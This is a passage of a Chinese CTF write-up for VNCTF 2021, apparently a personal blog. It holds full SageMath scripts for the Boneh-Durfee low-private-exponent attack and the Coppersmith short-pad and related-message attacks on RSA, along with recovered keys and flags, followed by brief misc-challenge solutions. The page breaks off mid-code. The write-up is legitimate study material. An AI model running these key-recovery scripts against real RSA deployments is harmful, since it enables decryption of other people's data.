class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br></pre></td><td class="code"><pre><span class="line">import time</span><br><span class="line"></span><br><span class="line">############################################</span><br><span class="line"># Config</span><br><span class="line">##########################################</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">Setting debug to true will display more informations</span><br><span class="line">about the lattice, the bounds, the vectors...</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">debug &#x3D; True</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">Setting strict to true will stop the algorithm (and</span><br><span class="line">return (-1, -1)) if we don&#39;t have a correct </span><br><span class="line">upperbound on the determinant. Note that this </span><br><span class="line">doesn&#39;t necesseraly mean that no solutions </span><br><span class="line">will be found since the theoretical upperbound is</span><br><span class="line">usualy far away from actual results. That is why</span><br><span class="line">you should probably use &#96;strict &#x3D; False&#96;</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">strict &#x3D; False</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">This is experimental, but has provided remarkable results</span><br><span class="line">so far. It tries to reduce the lattice as much as it can</span><br><span class="line">while keeping its efficiency. I see no reason not to use</span><br><span class="line">this option, but if things don&#39;t work, you should try</span><br><span class="line">disabling it</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">helpful_only &#x3D; True</span><br><span class="line">dimension_min &#x3D; 7 # stop removing if lattice reaches that dimension</span><br><span class="line"></span><br><span class="line">############################################</span><br><span class="line"># Functions</span><br><span class="line">##########################################</span><br><span class="line"></span><br><span class="line"># display stats on helpful vectors</span><br><span class="line">def helpful_vectors(BB, modulus):</span><br><span class="line">    nothelpful &#x3D; 0</span><br><span class="line">    for ii in range(BB.dimensions()[0]):</span><br><span class="line">        if BB[ii,ii] &gt;&#x3D; modulus:</span><br><span class="line">            nothelpful +&#x3D; 1</span><br><span class="line"></span><br><span class="line">    print (nothelpful, &quot;&#x2F;&quot;, BB.dimensions()[0], &quot; vectors are not helpful&quot;)</span><br><span class="line"></span><br><span class="line"># display matrix picture with 0 and X</span><br><span class="line">def matrix_overview(BB, bound):</span><br><span class="line">    for ii in range(BB.dimensions()[0]):</span><br><span class="line">        a &#x3D; (&#39;%02d &#39; % ii)</span><br><span class="line">        for jj in range(BB.dimensions()[1]):</span><br><span class="line">            a +&#x3D; &#39;0&#39; if BB[ii,jj] &#x3D;&#x3D; 0 else &#39;X&#39;</span><br><span class="line">            if BB.dimensions()[0] &lt; 60:</span><br><span class="line">                a +&#x3D; &#39; &#39;</span><br><span class="line">        if BB[ii, ii] &gt;&#x3D; bound:</span><br><span class="line">            a +&#x3D; &#39;~&#39;</span><br><span class="line">        print (a)</span><br><span class="line"></span><br><span class="line"># tries to remove unhelpful vectors</span><br><span class="line"># we start at current &#x3D; n-1 (last vector)</span><br><span class="line">def remove_unhelpful(BB, monomials, bound, current):</span><br><span class="line">    # end of our recursive function</span><br><span class="line">    if current &#x3D;&#x3D; -1 or BB.dimensions()[0] &lt;&#x3D; dimension_min:</span><br><span class="line">        return BB</span><br><span class="line"></span><br><span class="line">    # we start by checking from the end</span><br><span class="line">    for ii in range(current, -1, -1):</span><br><span class="line">        # if it is unhelpful:</span><br><span class="line">        if BB[ii, ii] &gt;&#x3D; bound:</span><br><span class="line">            affected_vectors &#x3D; 0</span><br><span class="line">            affected_vector_index &#x3D; 0</span><br><span class="line">            # let&#39;s check if it affects other vectors</span><br><span class="line">            for jj in range(ii + 1, BB.dimensions()[0]):</span><br><span class="line">                # if another vector is affected:</span><br><span class="line">                # we increase the count</span><br><span class="line">                if BB[jj, ii] !&#x3D; 0:</span><br><span class="line">                    affected_vectors +&#x3D; 1</span><br><span class="line">                    affected_vector_index &#x3D; jj</span><br><span class="line"></span><br><span class="line">            # level:0</span><br><span class="line">            # if no other vectors end up affected</span><br><span class="line">            # we remove it</span><br><span class="line">            if affected_vectors &#x3D;&#x3D; 0:</span><br><span class="line">                print(&quot;* removing unhelpful vector&quot;, ii)</span><br><span class="line">                BB &#x3D; BB.delete_columns([ii])</span><br><span class="line">                BB &#x3D; BB.delete_rows([ii])</span><br><span class="line">                monomials.pop(ii)</span><br><span class="line">                BB &#x3D; remove_unhelpful(BB, monomials, bound, ii-1)</span><br><span class="line">                return BB</span><br><span class="line"></span><br><span class="line">            # level:1</span><br><span class="line">            # if just one was affected we check</span><br><span class="line">            # if it is affecting someone else</span><br><span class="line">            elif affected_vectors &#x3D;&#x3D; 1:</span><br><span class="line">                affected_deeper &#x3D; True</span><br><span class="line">                for kk in range(affected_vector_index + 1, BB.dimensions()[0]):</span><br><span class="line">                    # if it is affecting even one vector</span><br><span class="line">                    # we give up on this one</span><br><span class="line">                    if BB[kk, affected_vector_index] !&#x3D; 0:</span><br><span class="line">                        affected_deeper &#x3D; False</span><br><span class="line">                # remove both it if no other vector was affected and</span><br><span class="line">                # this helpful vector is not helpful enough</span><br><span class="line">                # compared to our unhelpful one</span><br><span class="line">                if affected_deeper and abs(bound - BB[affected_vector_index, affected_vector_index]) &lt; abs(bound - BB[ii, ii]):</span><br><span class="line">                    print (&quot;* removing unhelpful vectors&quot;, ii, &quot;and&quot;, affected_vector_index)</span><br><span class="line">                    BB &#x3D; BB.delete_columns([affected_vector_index, ii])</span><br><span class="line">                    BB &#x3D; BB.delete_rows([affected_vector_index, ii])</span><br><span class="line">                    monomials.pop(affected_vector_index)</span><br><span class="line">                    monomials.pop(ii)</span><br><span class="line">                    BB &#x3D; remove_unhelpful(BB, monomials, bound, ii-1)</span><br><span class="line">                    return BB</span><br><span class="line">    # nothing happened</span><br><span class="line">    return BB</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot; </span><br><span class="line">Returns:</span><br><span class="line">* 0,0   if it fails</span><br><span class="line">* -1,-1 if &#96;strict&#x3D;true&#96;, and determinant doesn&#39;t bound</span><br><span class="line">* x0,y0 the solutions of &#96;pol&#96;</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">def boneh_durfee(pol, modulus, mm, tt, XX, YY):</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Boneh and Durfee revisited by Herrmann and May</span><br><span class="line">    </span><br><span class="line">    finds a solution if:</span><br><span class="line">    * d &lt; N^delta</span><br><span class="line">    * |x| &lt; e^delta</span><br><span class="line">    * |y| &lt; e^0.5</span><br><span class="line">    whenever delta &lt; 1 - sqrt(2)&#x2F;2 ~ 0.292</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">    # substitution (Herrman and May)</span><br><span class="line">    PR.&lt;u, x, y&gt; &#x3D; PolynomialRing(ZZ)</span><br><span class="line">    Q &#x3D; PR.quotient(x*y + 1 - u) # u &#x3D; xy + 1</span><br><span class="line">    polZ &#x3D; Q(pol).lift()</span><br><span class="line"></span><br><span class="line">    UU &#x3D; XX*YY + 1</span><br><span class="line"></span><br><span class="line">    # x-shifts</span><br><span class="line">    gg &#x3D; []</span><br><span class="line">    for kk in range(mm + 1):</span><br><span class="line">        for ii in range(mm - kk + 1):</span><br><span class="line">            xshift &#x3D; x^ii * modulus^(mm - kk) * polZ(u, x, y)^kk</span><br><span class="line">            gg.append(xshift)</span><br><span class="line">    gg.sort()</span><br><span class="line"></span><br><span class="line">    # x-shifts list of monomials</span><br><span class="line">    monomials &#x3D; []</span><br><span class="line">    for polynomial in gg:</span><br><span class="line">        for monomial in polynomial.monomials():</span><br><span class="line">            if monomial not in monomials:</span><br><span class="line">                monomials.append(monomial)</span><br><span class="line">    monomials.sort()</span><br><span class="line">    </span><br><span class="line">    # y-shifts (selected by Herrman and May)</span><br><span class="line">    for jj in range(1, tt + 1):</span><br><span class="line">        for kk in range(floor(mm&#x2F;tt) * jj, mm + 1):</span><br><span class="line">            yshift &#x3D; y^jj * polZ(u, x, y)^kk * modulus^(mm - kk)</span><br><span class="line">            yshift &#x3D; Q(yshift).lift()</span><br><span class="line">            gg.append(yshift) # substitution</span><br><span class="line">    </span><br><span class="line">    # y-shifts list of monomials</span><br><span class="line">    for jj in range(1, tt + 1):</span><br><span class="line">        for kk in range(floor(mm&#x2F;tt) * jj, mm + 1):</span><br><span class="line">            monomials.append(u^kk * y^jj)</span><br><span class="line"></span><br><span class="line">    # construct lattice B</span><br><span class="line">    nn &#x3D; len(monomials)</span><br><span class="line">    BB &#x3D; Matrix(ZZ, nn)</span><br><span class="line">    for ii in range(nn):</span><br><span class="line">        BB[ii, 0] &#x3D; gg[ii](0, 0, 0)</span><br><span class="line">        for jj in range(1, ii + 1):</span><br><span class="line">            if monomials[jj] in gg[ii].monomials():</span><br><span class="line">                BB[ii, jj] &#x3D; gg[ii].monomial_coefficient(monomials[jj]) * monomials[jj](UU,XX,YY)</span><br><span class="line"></span><br><span class="line">    # Prototype to reduce the lattice</span><br><span class="line">    if helpful_only:</span><br><span class="line">        # automatically remove</span><br><span class="line">        BB &#x3D; remove_unhelpful(BB, monomials, modulus^mm, nn-1)</span><br><span class="line">        # reset dimension</span><br><span class="line">        nn &#x3D; BB.dimensions()[0]</span><br><span class="line">        if nn &#x3D;&#x3D; 0:</span><br><span class="line">            print (&quot;failure&quot;)</span><br><span class="line">            return 0,0</span><br><span class="line"></span><br><span class="line">    # check if vectors are helpful</span><br><span class="line">    if debug:</span><br><span class="line">        helpful_vectors(BB, modulus^mm)</span><br><span class="line">    </span><br><span class="line">    # check if determinant is correctly bounded</span><br><span class="line">    det &#x3D; BB.det()</span><br><span class="line">    bound &#x3D; modulus^(mm*nn)</span><br><span class="line">    if det &gt;&#x3D; bound:</span><br><span class="line">        print (&quot;We do not have det &lt; bound. Solutions might not be found.&quot;)</span><br><span class="line">        print (&quot;Try with highers m and t.&quot;)</span><br><span class="line">        if debug:</span><br><span class="line">            diff &#x3D; (log(det) - log(bound)) &#x2F; log(2)</span><br><span class="line">            print(&quot;size det(L) - size e^(m*n) &#x3D; &quot;, floor(diff))</span><br><span class="line">        if strict:</span><br><span class="line">            return -1, -1</span><br><span class="line">    else:</span><br><span class="line">        print (&quot;det(L) &lt; e^(m*n) (good! If a solution exists &lt; N^delta, it will be found)&quot;)</span><br><span class="line"></span><br><span class="line">    # display the lattice basis</span><br><span class="line">    if debug:</span><br><span class="line">        matrix_overview(BB, modulus^mm)</span><br><span class="line"></span><br><span class="line">    # LLL</span><br><span class="line">    if debug:</span><br><span class="line">        print (&quot;optimizing basis of the lattice via LLL, this can take a long time&quot;)</span><br><span class="line"></span><br><span class="line">    BB &#x3D; BB.LLL()</span><br><span class="line"></span><br><span class="line">    if debug:</span><br><span class="line">        print (&quot;LLL is done!&quot;)</span><br><span class="line"></span><br><span class="line">    # transform vector i &amp; j -&gt; polynomials 1 &amp; 2</span><br><span class="line">    if debug:</span><br><span class="line">        print (&quot;looking for independent vectors in the lattice&quot;)</span><br><span class="line">    found_polynomials &#x3D; False</span><br><span class="line">    </span><br><span class="line">    for pol1_idx in range(nn - 1):</span><br><span class="line">        for pol2_idx in range(pol1_idx + 1, nn):</span><br><span class="line">            # for i and j, create the two polynomials</span><br><span class="line">            PR.&lt;w,z&gt; &#x3D; PolynomialRing(ZZ)</span><br><span class="line">            pol1 &#x3D; pol2 &#x3D; 0</span><br><span class="line">            for jj in range(nn):</span><br><span class="line">                pol1 +&#x3D; monomials[jj](w*z+1,w,z) * BB[pol1_idx, jj] &#x2F; monomials[jj](UU,XX,YY)</span><br><span class="line">                pol2 +&#x3D; monomials[jj](w*z+1,w,z) * BB[pol2_idx, jj] &#x2F; monomials[jj](UU,XX,YY)</span><br><span class="line"></span><br><span class="line">            # resultant</span><br><span class="line">            PR.&lt;q&gt; &#x3D; PolynomialRing(ZZ)</span><br><span class="line">            rr &#x3D; pol1.resultant(pol2)</span><br><span class="line"></span><br><span class="line">            # are these good polynomials?</span><br><span class="line">            if rr.is_zero() or rr.monomials() &#x3D;&#x3D; [1]:</span><br><span class="line">                continue</span><br><span class="line">            else:</span><br><span class="line">                print (&quot;found them, using vectors&quot;, pol1_idx, &quot;and&quot;, pol2_idx)</span><br><span class="line">                found_polynomials &#x3D; True</span><br><span class="line">                break</span><br><span class="line">        if found_polynomials:</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">    if not found_polynomials:</span><br><span class="line">        print (&quot;no independant vectors could be found. This should very rarely happen...&quot;)</span><br><span class="line">        return 0, 0</span><br><span class="line">    </span><br><span class="line">    rr &#x3D; rr(q, q)</span><br><span class="line"></span><br><span class="line">    # solutions</span><br><span class="line">    soly &#x3D; rr.roots()</span><br><span class="line"></span><br><span class="line">    if len(soly) &#x3D;&#x3D; 0:</span><br><span class="line">        print (&quot;Your prediction (delta) is too small&quot;)</span><br><span class="line">        return 0, 0</span><br><span class="line"></span><br><span class="line">    soly &#x3D; soly[0][0]</span><br><span class="line">    ss &#x3D; pol1(q, soly)</span><br><span class="line">    solx &#x3D; ss.roots()[0][0]</span><br><span class="line"></span><br><span class="line">    #</span><br><span class="line">    return solx, soly</span><br><span class="line"></span><br><span class="line">def example():</span><br><span class="line">    ############################################</span><br><span class="line">    # How To Use This Script</span><br><span class="line">    ##########################################</span><br><span class="line"></span><br><span class="line">    #</span><br><span class="line">    # The problem to solve (edit the following values)</span><br><span class="line">    #</span><br><span class="line"></span><br><span class="line">    # the modulus</span><br><span class="line">    N &#x3D; 97814568264814384858194701955408461509880555772006698372422205341758322175891474378211599333051180365254844248340812534463000531890490435018379585036704801177155418066770861143206836558793774360498040810255823235715535487716966004194143204900564413879660115112965484824906920141847149888933004740523449213441</span><br><span class="line">    # the public exponent</span><br><span class="line">    e &#x3D; 93943500165298065499950418373429723509334252629406924973909070866091749987346174290549648466771963135864917881154270768788129489671486923171733460927672763251885052132144244633336183737015936611716827476566876619327956203686756399730968768494676888428137426449681845021696056187478027217734766494935085365973</span><br><span class="line"></span><br><span class="line">    # the hypothesis on the private exponent (the theoretical maximum is 0.292)</span><br><span class="line">    delta &#x3D; .18 # this means that d &lt; N^delta</span><br><span class="line"></span><br><span class="line">    #</span><br><span class="line">    # Lattice (tweak those values)</span><br><span class="line">    #</span><br><span class="line"></span><br><span class="line">    # you should tweak this (after a first run), (e.g. increment it until a solution is found)</span><br><span class="line">    m &#x3D; 4 # size of the lattice (bigger the better&#x2F;slower)</span><br><span class="line"></span><br><span class="line">    # you need to be a lattice master to tweak these</span><br><span class="line">    t &#x3D; int((1-2*delta) * m)  # optimization from Herrmann and May</span><br><span class="line">    X &#x3D; 2*floor(N^delta)  # this _might_ be too much</span><br><span class="line">    Y &#x3D; floor(N^(1&#x2F;2))    # correct if p, q are ~ same size</span><br><span class="line"></span><br><span class="line">    #</span><br><span class="line">    # Don&#39;t touch anything below</span><br><span class="line">    #</span><br><span class="line"></span><br><span class="line">    # Problem put in equation</span><br><span class="line">    P.&lt;x,y&gt; &#x3D; PolynomialRing(ZZ)</span><br><span class="line">    A &#x3D; int((N+1)&#x2F;2)</span><br><span class="line">    pol &#x3D; 1 + x * (A + y)</span><br><span class="line"></span><br><span class="line">    #</span><br><span class="line">    # Find the solutions!</span><br><span class="line">    #</span><br><span class="line"></span><br><span class="line">    # Checking bounds</span><br><span class="line">    if debug:</span><br><span class="line">        print (&quot;&#x3D;&#x3D;&#x3D; checking values &#x3D;&#x3D;&#x3D;&quot;)</span><br><span class="line">        print (&quot;* delta:&quot;, delta)</span><br><span class="line">        print (&quot;* delta &lt; 0.292&quot;, delta &lt; 0.292)</span><br><span class="line">        print (&quot;* size of e:&quot;, int(log(e)&#x2F;log(2)))</span><br><span class="line">        print (&quot;* size of N:&quot;, int(log(N)&#x2F;log(2)))</span><br><span class="line">        print (&quot;* m:&quot;, m, &quot;, t:&quot;, t)</span><br><span class="line"></span><br><span class="line">    # boneh_durfee</span><br><span class="line">    if debug:</span><br><span class="line">        print (&quot;&#x3D;&#x3D;&#x3D; running algorithm &#x3D;&#x3D;&#x3D;&quot;)</span><br><span class="line">        start_time &#x3D; time.time()</span><br><span class="line"></span><br><span class="line">    solx, soly &#x3D; boneh_durfee(pol, e, m, t, X, Y)</span><br><span class="line"></span><br><span class="line">    # found a solution?</span><br><span class="line">    if solx &gt; 0:</span><br><span class="line">        print (&quot;&#x3D;&#x3D;&#x3D; solution found &#x3D;&#x3D;&#x3D;&quot;)</span><br><span class="line">        if False:</span><br><span class="line">            print (&quot;x:&quot;, solx)</span><br><span class="line">            print (&quot;y:&quot;, soly)</span><br><span class="line"></span><br><span class="line">        d &#x3D; int(pol(solx, soly) &#x2F; e)</span><br><span class="line">        print (&quot;private key found:&quot;, d)</span><br><span class="line">    else:</span><br><span class="line">        print (&quot;&#x3D;&#x3D;&#x3D; no solution was found &#x3D;&#x3D;&#x3D;&quot;)</span><br><span class="line"></span><br><span class="line">    if debug:</span><br><span class="line">        print(&quot;&#x3D;&#x3D;&#x3D; %s seconds &#x3D;&#x3D;&#x3D;&quot; % (time.time() - start_time))</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    example()</span><br></pre></td></tr></table></figure><p>求url</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">e=<span class="number">93943500165298065499950418373429723509334252629406924973909070866091749987346174290549648466771963135864917881154270768788129489671486923171733460927672763251885052132144244633336183737015936611716827476566876619327956203686756399730968768494676888428137426449681845021696056187478027217734766494935085365973</span></span><br><span class="line">d=<span class="number">103079922798932082066165266087442072203677117380612800709240732626110126828541</span></span><br><span class="line">n=<span class="number">97814568264814384858194701955408461509880555772006698372422205341758322175891474378211599333051180365254844248340812534463000531890490435018379585036704801177155418066770861143206836558793774360498040810255823235715535487716966004194143204900564413879660115112965484824906920141847149888933004740523449213441</span></span><br><span class="line">c=<span class="number">86143311788363675684674113699193046781796638913243016152555572150858159500527674063754694514501999791875561142925154991000532628799185608465062814546108160434468098898040769021072007374156546314975240583347468026001633652940408779155579339470960571067652924814623371177901052302005289155305089588204204313261</span></span><br><span class="line">print(long_to_bytes(<span class="built_in">pow</span>(c,d,n)))</span><br><span class="line"></span><br><span class="line"><span class="comment">#https://dawn-whisper.lanzous.com/iCAv0lod7yj-password:gzjq</span></span><br></pre></td></tr></table></figure><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210315021528331.png" alt="image-20210315021528331"></p><p>得到另一个附件，发现类似前年强网杯，上周做一个国外的比赛也刚好了解。直接套脚本Coppersmith’s short-pad attack</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line">    def short_pad_attack(c1, c2, e, n):</span><br><span class="line">        PRxy.&lt;x,y&gt; &#x3D; PolynomialRing(Zmod(n))</span><br><span class="line">        PRx.&lt;xn&gt; &#x3D; PolynomialRing(Zmod(n))</span><br><span class="line">        PRZZ.&lt;xz,yz&gt; &#x3D; PolynomialRing(Zmod(n))</span><br><span class="line"></span><br><span class="line">        g1 &#x3D; x^e - c1</span><br><span class="line">        g2 &#x3D; (x+y)^e - c2</span><br><span class="line"></span><br><span class="line">        q1 &#x3D; g1.change_ring(PRZZ)</span><br><span class="line">        q2 &#x3D; g2.change_ring(PRZZ)</span><br><span class="line"></span><br><span class="line">        h &#x3D; q2.resultant(q1)</span><br><span class="line">        h &#x3D; h.univariate_polynomial()</span><br><span class="line">        h &#x3D; h.change_ring(PRx).subs(y&#x3D;xn)</span><br><span class="line">        h &#x3D; h.monic()</span><br><span class="line"></span><br><span class="line">        kbits &#x3D; n.nbits()&#x2F;&#x2F;(2*e*e)</span><br><span class="line">        diff &#x3D; h.small_roots(X&#x3D;2^kbits, beta&#x3D;0.5)[0]  # find root &lt; 2^kbits with factor &gt;&#x3D; n^0.5</span><br><span class="line"></span><br><span class="line">        return diff</span><br><span class="line"></span><br><span class="line">    def related_message_attack(c1, c2, diff, e, n):</span><br><span class="line">        PRx.&lt;x&gt; &#x3D; PolynomialRing(Zmod(n))</span><br><span class="line">        g1 &#x3D; x^e - c1</span><br><span class="line">        g2 &#x3D; (x+diff)^e - c2</span><br><span class="line"></span><br><span class="line">        def gcd(g1, g2):</span><br><span class="line">            while g2:</span><br><span class="line">                g1, g2 &#x3D; g2, g1 % g2</span><br><span class="line">            return g1.monic()</span><br><span class="line"></span><br><span class="line">        return -gcd(g1, g2)[0]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">        n &#x3D; 143224951702807798608353389056046982493788310072914995404719898237226283884553121669729599925829562704800197375580487019006702401282671268969358774635337351738915083955659230582177495821699251999928502338923489031347921151957398310960671307216790020399224115377846788378990638367296298663795893865325304226511</span><br><span class="line">        e &#x3D; 7</span><br><span class="line"></span><br><span class="line">        c1 &#x3D; 74797173657575640598140788410852016843612519588375968190579734420951374103129570637822547217967978911328419808529204143522454142303138959013220811558490951614314306849367068478190797885056922705403028856734095288522290055309880572321557493798362056216783777593386133347693892941928131945986087712737862263761</span><br><span class="line">        c2 &#x3D; 9209695919437085323423940852135308337887271742988391422139555924185234849146079306139570263602339983687993333013333937719071267190971983543492940032646907167417161479697805991443259327402389097539126399994414628326218438416138199892253597375493026563369334352434282120293396846427418323600336867792587721214</span><br><span class="line"></span><br><span class="line">        diff &#x3D; short_pad_attack(c1, c2, e, n)</span><br><span class="line">        print (&quot;difference of two messages is %d&quot; % diff)</span><br><span class="line">        m1 &#x3D; related_message_attack(c1, c2, diff, e, n)</span><br><span class="line">        print (long_to_bytes(m1))</span><br><span class="line">        print (long_to_bytes(m1 + diff))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210315022131756.png" alt="image-20210315022131756"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#VNCTF&#123;H4ppyNeWy34r!2021_V&amp;N_figHt1ng!&#125;</span></span><br></pre></td></tr></table></figure><p>化身脚本小子。。。。。。。（还是要多收集脚本</p><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="Check-In"><a href="#Check-In" class="headerlink" title="Check_In"></a>Check_In</h2><p>明文显示</p><p>vnctf{Have_a_good_time!}</p><h2 id="Questionnaire"><a href="#Questionnaire" class="headerlink" title="Questionnaire"></a>Questionnaire</h2><p>填问卷，得flag。</p><h2 id="冰冰好像藏着秘密"><a href="#冰冰好像藏着秘密" class="headerlink" title="冰冰好像藏着秘密"></a>冰冰好像藏着秘密</h2><p>提取，吾爱工具直接提取出水印</p><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210315090645888.png" alt="image-20210315090645888"></p><p>手动读写一下即可。。。。。</p><h2 id="Do-you-like-Rhythm-Doctor"><a href="#Do-you-like-Rhythm-Doctor" class="headerlink" title="Do_you_like_Rhythm_Doctor"></a>Do_you_like_Rhythm_Doctor</h2><p>附件改后缀打开有两个文件。</p><p>图片看了半天没没啥用，看另一个文件</p><p>信息检索出一个软件，rdle,下载后打开附件目录下的.rdlevel文件。看到这种类型的题想到音频隐写出现波形，可以转成0101010，发现此题也有两个特定的变量，。波形和矩形。看到刚好八个一组想到ascii格式尝试将波形设为1，矩形设为0，可以得到前八个为01100110，<img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210315012810411.png" alt="image-20210315012810411"></p><p>转成ascii即为f，以次手动将所有转换即可。</p><p>flag{W31come_V&amp;N_CTF}</p><h2 id="interesting-fishing"><a href="#interesting-fishing" class="headerlink" title="interesting_fishing"></a>interesting_fishing</h2><p>看到提示邮件，尝试将bin文件改成邮件格式eml</p><p><img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210315083353261.png" alt="image-20210315083353261"></p><p>将附件保存下来。。然后打开</p><p>关注题目提示，同时找到一段话<img src="https://13-1301107080.cos.ap-guangzhou.myqcloud.com/image-20210315084022425.png" alt="image-20210315084022425"></p><p>进去该目录，同时在查看那里取消隐藏系统文件。</p><p>打开在末端发现源码经过了base64编码，</p><p>还原后</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span 